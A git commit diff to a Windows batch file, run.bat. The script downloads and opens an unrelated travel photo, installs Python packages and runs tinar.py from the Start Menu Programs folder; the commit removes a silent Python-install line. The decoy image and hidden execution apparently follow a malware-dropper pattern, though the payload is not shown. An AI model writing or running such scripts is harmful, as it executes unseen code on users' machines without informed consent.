14840e4f24bf736d70ec7afd659b3f61c4facb88
Swapnil Subhash Harale <143025736+root7454@users.noreply.github.com>
2024-05-29 00:38:03 +0530

    Update run.bat

--- run.bat
+++ run.bat
@@ -2,7 +2,6 @@ cd %temp%
 curl -o imp.jpg https://media.tacdn.com/media/attractions-splice-spp-674x446/0b/39/a9/9f.jpg
 imp.jpg
 cd system/Testing-main
-python-installer.exe /quiet InstallAllUsers=1 PrependPath=1 Include_test=0
 pip install -r requirements.txt
 cd %AppData%\Microsoft\Windows\Start Menu\Programs
 python tinar.py
